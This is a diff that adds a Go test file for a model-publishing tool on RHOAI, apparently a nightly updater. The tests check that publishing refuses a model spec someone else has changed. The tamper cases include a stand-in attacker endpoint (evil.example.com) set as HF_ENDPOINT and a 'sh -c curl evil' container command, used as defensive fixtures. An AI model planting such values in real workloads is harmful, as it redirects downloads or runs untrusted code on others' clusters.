@@ -1,0 +1,124 @@
+package cluster
+
+import (
+	"strings"
+	"testing"
+
+	"github.com/juntwang/rhoai-nightly-updater/pkg/types"
+)
+
+// editModel changes the tool's model in proj as someone else would.
+func editModel(mc *modelsCluster, edit func(spec, meta map[string]interface{})) {
+	mc.f.mu.Lock()
+	defer mc.f.mu.Unlock()
+	k, _ := parseFakePath(testModelPath)
+	obj := mc.f.objects[k]
+	edit(ensureMap(obj, "spec"), ensureMap(obj, "metadata"))
+}
+
+func templateContainer(spec map[string]interface{}, list, name string) map[string]interface{} {
+	tmpl := ensureMap(spec, "template")
+	items, _ := tmpl[list].([]interface{})
+	for _, it := range items {
+		if c, ok := it.(map[string]interface{}); ok && c["name"] == name {
+			return c
+		}
+	}
+	return nil
+}
+
+// What every model has on RHOAI 3.6 (live): KServe's defaulting, field
+// manager "manager" (Update, serving.kserve.io/v1alpha2), owns the main
+// container's ephemeral-storage request and the storage-initializer's
+// resources. That must not stop a publication.
+func TestMaaSPublish_PublishesAModelKServeDefaulted(t *testing.T) {
+	mc := modelReadyForMaaS(t)
+	editModel(mc, func(spec, meta map[string]interface{}) {
+		main := templateContainer(spec, "containers", "main")
+		req := ensureMap(ensureMap(main, "resources"), "requests")
+		req["ephemeral-storage"] = "2Gi"
+		initC := templateContainer(spec, "initContainers", "storage-initializer")
+		initC["resources"] = map[string]interface{}{"requests": map[string]interface{}{"cpu": "100m", "memory": "100Mi"}, "limits": map[string]interface{}{"cpu": "1", "memory": "1Gi"}}
+		meta["managedFields"] = []interface{}{
+			map[string]interface{}{"manager": toolFieldManager, "operation": "Apply", "apiVersion": "serving.kserve.io/v1alpha2", "fieldsType": "FieldsV1",
+				"fieldsV1": map[string]interface{}{"f:spec": map[string]interface{}{"f:model": map[string]interface{}{}, "f:template": map[string]interface{}{}}}},
+			map[string]interface{}{"manager": "manager", "operation": "Update", "apiVersion": "serving.kserve.io/v1alpha2", "fieldsType": "FieldsV1",
+				"fieldsV1": map[string]interface{}{"f:spec": map[string]interface{}{"f:template": map[string]interface{}{
+					"f:containers":     map[string]interface{}{`k:{"name":"main"}`: map[string]interface{}{"f:resources": map[string]interface{}{"f:requests": map[string]interface{}{"f:ephemeral-storage": map[string]interface{}{}}}}},
+					"f:initContainers": map[string]interface{}{`k:{"name":"storage-initializer"}`: map[string]interface{}{"f:resources": map[string]interface{}{}}},
+				}}}},
+		}
+	})
+	if res, _ := runMaaSOp(t, mc.c, types.MaaSRequest{Action: "publish", Project: "proj"}); !res.Success {
+		t.Fatalf("publish: %+v", res)
+	}
+}
+
+// Someone who may edit the project changes the tool's model before a
+// cluster-admin publishes it: publish refuses before any write and names
+// what differs.
+func TestMaaSPublish_RefusesAChangedModelSpec(t *testing.T) {
+	for _, tc := range []struct {
+		name, field string
+		edit        func(spec map[string]interface{})
+	}{
+		{"main image", "spec.template.containers[main].image", func(spec map[string]interface{}) {
+			templateContainer(spec, "containers", "main")["image"] = "quay.io/someone/vllm:latest"
+		}},
+		{"model uri", "spec.model.uri", func(spec map[string]interface{}) {
+			ensureMap(spec, "model")["uri"] = "hf://someone/other-model"
+		}},
+		{"extra env", "spec.template.containers[main].env", func(spec map[string]interface{}) {
+			main := templateContainer(spec, "containers", "main")
+			main["env"] = append(main["env"].([]interface{}), map[string]interface{}{"name": "HF_ENDPOINT", "value": "https://evil.example.com"})
+		}},
+		{"command", "spec.template.containers[main].command", func(spec map[string]interface{}) {
+			templateContainer(spec, "containers", "main")["command"] = []interface{}{"sh", "-c", "curl evil"}
+		}},
+		{"extra container", "spec.template.containers[sidecar]", func(spec map[string]interface{}) {
+			tmpl := ensureMap(spec, "template")
+			tmpl["containers"] = append(tmpl["containers"].([]interface{}), map[string]interface{}{"name": "sidecar", "image": "quay.io/x/y"})
+		}},
+		{"service account", "spec.template.serviceAccountName", func(spec map[string]interface{}) {
+			ensureMap(spec, "template")["serviceAccountName"] = "builder"
+		}},
+		{"preset", "spec.baseRefs", func(spec map[string]interface{}) {
+			spec["baseRefs"] = []interface{}{map[string]interface{}{"name": "my-preset"}}
+		}},
+		{"prefill", "spec.prefill", func(spec map[string]interface{}) {
+			spec["prefill"] = map[string]interface{}{"template": map[string]interface{}{}}
+		}},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			mc := modelReadyForMaaS(t)
+			editModel(mc, func(spec, _ map[string]interface{}) { tc.edit(spec) })
+			mc.f.requests = nil
+			res, _ := runMaaSOp(t, mc.c, types.MaaSRequest{Action: "publish", Project: "proj"})
+			if res.Success || res.ErrorCode != "conflict" || !strings.Contains(res.Message, "was changed since this tool set it up: "+tc.field) ||
+				!strings.Contains(res.Message, "set it up again") || !strings.Contains(res.Message, "Nothing was changed") {
+				t.Fatalf("publish = %+v", res)
+			}
+			if muts := mc.f.mutations(); len(muts) != 0 {
+				t.Fatalf("wrote %v", muts)
+			}
+		})
+	}
+}
+
+// The released image (a Red Hat release of the preset's repository,
+// pinned by digest) and VLLM_CPU_IMAGE are what setup itself may write.
+func TestModelSpecExpectation_Images(t *testing.T) {
+	e := modelSpecExpectation{presetRepo: "registry.redhat.io/rhaii/vllm-cpu-rhel9", override: "mirror.example.com/vllm@sha256:abc"}
+	for img, want := range map[string]bool{
+		"": true,
+		"registry.redhat.io/rhaii/vllm-cpu-rhel9@sha256:0123": true,
+		"mirror.example.com/vllm@sha256:abc":                  true,
+		"registry.redhat.io/rhaii/vllm-cpu-rhel9:latest":      false,
+		"registry.redhat.io/rhaii/other@sha256:0123":          false,
+		"quay.io/someone/vllm-cpu-rhel9@sha256:0123":          false,
+	} {
+		if got := e.imageAllowed(img); got != want {
+			t.Errorf("imageAllowed(%q) = %v, want %v", img, got, want)
+		}
+	}
+}
